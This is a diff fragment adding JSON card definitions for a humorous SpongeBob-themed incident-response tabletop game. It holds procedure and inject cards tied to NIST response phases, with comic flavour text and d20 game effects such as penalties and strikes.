+    "description": "Coordinate response efforts, defuse responder panic, streamline communication channels, and prioritize critical assets.",
+    "flavorText": "'Keep calm and protect the secret formula at all costs!'",
+    "iconName": "shield",
+    "checks": [
+      { "target": 11, "description": "Remove 1 Strike and grant +2 to all defenders' next roll" }
+    ]
+  },
+  {
+    "id": "PROC-016",
+    "title": "Executive & Legal PR Shield",
+    "deck": "procedures",
+    "subtitle": "Regulatory Disclosure & Crisis PR",
+    "nistPhase": "Post-Incident Activity",
+    "description": "Draft compliance disclosures for maritime data regulators while keeping Mr. Krabs from firing the SOC to save cash.",
+    "flavorText": "'Explain the breach to the board without using the word catastrophic.'",
+    "iconName": "file-text",
+    "checks": [
+      { "target": 13, "description": "Prevent executive panic and neutralize next drawn inject" }
+    ]
+  },
+  {
+    "id": "INJ-001",
+    "title": "Squidward's Shift Ended",
+    "deck": "injects",
+    "subtitle": "Personnel Availability Friction",
+    "nistPhase": "Detection & Analysis",
+    "description": "The lead incident handler clocks out promptly at 5:00:00 PM and enables 'Do Not Disturb' on their shell phone.",
+    "flavorText": "'I am not paid enough to care about active cyber espionage on my time off.'",
+    "iconName": "alert-triangle",
+    "injectEffect": "+3 difficulty to the next two d20 procedure checks."
+  },
+  {
+    "id": "INJ-002",
+    "title": "Mr. Krabs Screams About the Electric Bill",
+    "deck": "injects",
+    "subtitle": "Executive Resource Deprivation",
+    "nistPhase": "Detection & Analysis",
+    "description": "The CEO storms into the SOC and physically pulls the plug on the secondary monitor wall to save four cents an hour.",
+    "flavorText": "'You're wasting my precious kilowatts staring at blinking green text!'",
+    "iconName": "alert-triangle",
+    "injectEffect": "All defenders lose 1 investigative action this turn."
+  },
+  {
+    "id": "INJ-003",
+    "title": "Over-Enthusiastic Spongebob Containment",
+    "deck": "injects",
+    "subtitle": "Accidental Service Destruction",
+    "nistPhase": "Containment & Eradication",
+    "description": "A junior analyst takes network containment literally and physically severs the main undersea fiber conduit with kitchen shears.",
+    "flavorText": "'I'm ready! I contained the breach! Look, no more packets at all!'",
+    "iconName": "skull",
+    "injectEffect": "Immediate catastrophic network outage: Add 2 Strikes to the doom tracker!"
+  },
+  {
+    "id": "INJ-004",
+    "title": "Health Inspector Surprise Audit",
+    "deck": "injects",
+    "subtitle": "Regulatory Interruption",
+    "nistPhase": "Post-Incident Activity",
+    "description": "Government health and safety inspectors arrive unannounced, demanding physical inspection of the kitchen while ransomware is detonating.",
+    "flavorText": "'What is that green sludge on the terminal? Is that compliant with health codes?'",
+    "iconName": "file-text",
+    "injectEffect": "Defenders must spend their next action on PR Shield or suffer +4 check penalty."
+  },
+  {
+    "id": "INJ-005",
+    "title": "Backups Dropped in Mariana Trench",
+    "deck": "injects",
+    "subtitle": "Disaster Recovery Failure",
+    "nistPhase": "Containment & Eradication",
+    "description": "The cold backup tape drive was accidentally dropped overboard into the deepest trench in the Pacific Ocean.",
+    "flavorText": "'They're safe from hackers down there! Unfortunately they're also under 36,000 feet of water.'",
+    "iconName": "database",
+    "injectEffect": "Backup Integrity Verification procedure cannot be used for the next 2 turns."
+  },
+  {
+    "id": "INJ-006",
+    "title": "Corporate Legal Gag Order",
+    "deck": "injects",
+    "subtitle": "Legal Bureaucracy Paralysis",
+    "nistPhase": "Post-Incident Activity",
+    "description": "Outside corporate attorneys order the SOC not to touch, power off, or inspect any systems until formal affidavits are prepared.",
+    "flavorText": "'Do not touch that keyboard! That memory dump could be discovered in litigation!'",
+    "iconName": "lock",
+    "injectEffect": "Skip next procedure attempt while counsel debates disclosure language."
+  },
+  {
+    "id": "INJ-007",
+    "title": "Ransomware Note Printed on Receipts",
+    "deck": "injects",
+    "subtitle": "Public PR Catastrophe",
+    "nistPhase": "Detection & Analysis",
+    "description": "The POS printer spooler compromised by ransomware prints the attacker's ransom demand on the back of every customer receipt.",
+    "flavorText": "'One double Krabby Patty, extra pickles, and... a Bitcoin wallet address?'",
+    "iconName": "file-text",
+    "injectEffect": "Add 1 Strike immediately due to public panic and patron outcry."
+  },
+  {
+    "id": "INJ-008",
+    "title": "Patrick Unplugs the Core Switch",
+    "deck": "injects",
+    "subtitle": "Physical Layer Tampering",
+    "nistPhase": "Detection & Analysis",
+    "description": "A well-meaning visitor unplugs the main rack power strip because he needed an outlet to charge his electric kelp toothbrush.",
+    "flavorText": "'Is mayonnaise an Ethernet cable?' — Patrick",
+    "iconName": "zap",
+    "injectEffect": "Network Traffic & Zeek Inspection procedures disabled for 1 turn."
+  },
+  {
+    "id": "INJ-009",
+    "title": "Media Leak to Bikini Bottom Gazette",
+    "deck": "injects",
+    "subtitle": "External Communications Leak",
+    "nistPhase": "Post-Incident Activity",
+    "description": "Perch Perkins is broadcasting live outside the restaurant reporting that the secret formula has already been leaked to the dark web.",
+    "flavorText": "'Breaking news: Is the Krabby Patty compromised? We interview panicked clams live!'",
+    "iconName": "wifi",
+    "injectEffect": "Add 1 Strike; defenders must pass an Executive PR Shield check (13+) to proceed."
+  },
+  {
+    "id": "INJ-010",
+    "title": "Expired SSL Cert on EDR Console",
+    "deck": "injects",
+    "subtitle": "Infrastructure Hygiene Failure",
+    "nistPhase": "Detection & Analysis",
+    "description": "The enterprise security dashboard certificate expired at midnight, locking responders out behind browser HSTS security warnings.",
+    "flavorText": "'NET::ERR_CERT_DATE_INVALID — The call is coming from inside the infrastructure!'",
+    "iconName": "lock",
+    "injectEffect": "+2 to all procedure checks until a patch or bypass check is made."
+  },
+  {
+    "id": "INJ-011",
+    "title": "CEO Demands Status Every 3 Minutes",
+    "deck": "injects",
+    "subtitle": "Micro-Management Interruption",
+    "nistPhase": "Detection & Analysis",
+    "description": "Mr. Krabs physically hovers over the responder's shoulder, repeatedly screaming 'ARE WE LOSING MONEY YET?!'.",
+    "flavorText": "'Time is money, and you're wasting both with that keyboard clatter!'",
+    "iconName": "alert-triangle",
+    "injectEffect": "Apply a -2 penalty to the defenders' next d20 roll."
+  },
+  {
+    "id": "INJ-012",
+    "title": "DDoS on Drive-Thru Intercom",
+    "deck": "injects",
+    "subtitle": "Distraction Attack",
+    "nistPhase": "Detection & Analysis",
+    "description": "The threat actor floods the restaurant order intercom with ear-piercing white noise to disrupt responder voice communications.",
+    "flavorText": "'Screeching static echoes through the kitchen headsets, drowning out the incident bridge.'",
+    "iconName": "radar",
+    "injectEffect": "+2 difficulty penalty to all containment procedures."
+  },
+  {
+    "id": "INJ-013",
+    "title": "Cloud Provider Bill Past Due",
+    "deck": "injects",
+    "subtitle": "Financial Resource Lockout",
+    "nistPhase": "Detection & Analysis",
+    "description": "AWS freezes access to the incident response analysis tenancy because Mr. Krabs attempted to pay the bill with expired discount coupons.",
+    "flavorText": "'Payment declined: We do not accept Krabby Koin or free burger tokens.'",
+    "iconName": "server",
+    "injectEffect": "-3 penalty on all cloud and log analysis procedures."
+  },
+  {
+    "id": "INJ-014",
+    "title": "Corrupted Syslog Partition",
+    "deck": "injects",
+    "subtitle": "Log Storage Overflow",
+    "nistPhase": "Detection & Analysis",
+    "description": "The SIEM server's `/var/log` volume is 100% full, causing the syslog daemon to crash and discard new incident telemetry.",
+    "flavorText": "'No space left on device: 0 bytes free. Who turned on debug logging for the ice machine?!'",
+    "iconName": "database",
+    "injectEffect": "SIEM Log Analysis checks suffer -3 penalty until cleaned up."
+  },
+  {
+    "id": "INJ-015",
+    "title": "Sandy's Over-Engineered Firewall",
+    "deck": "injects",
+    "subtitle": "Overzealous Defensive Configuration",
+    "nistPhase": "Containment & Eradication",
+    "description": "A well-meaning scientist deploys a custom regex firewall filter that blocks 90% of legitimate kitchen order traffic along with the attacker.",
+    "flavorText": "'Don't you worry, I wrote a 400-line Perl regular expression to fix the whole thing!'",
+    "iconName": "shield",
+    "injectEffect": "Roll d20: On 1-10, add 1 strike due to kitchen operational stoppage."
+  },
+  {
+    "id": "INJ-016",
+    "title": "Total Blackout in the Galley",
+    "deck": "injects",
+    "subtitle": "Facilities Power Failure",
+    "nistPhase": "Containment & Eradication",
+    "description": "A power surge trips the main breakers. Responders must run emergency diagnostic laptops on battery power in near-total darkness.",
+    "flavorText": "'The lights flicker out. In the green glow of UPS batteries, the incident continues.'",
+    "iconName": "zap",
+    "injectEffect": "+3 difficulty to all checks this turn."
+  }
+]
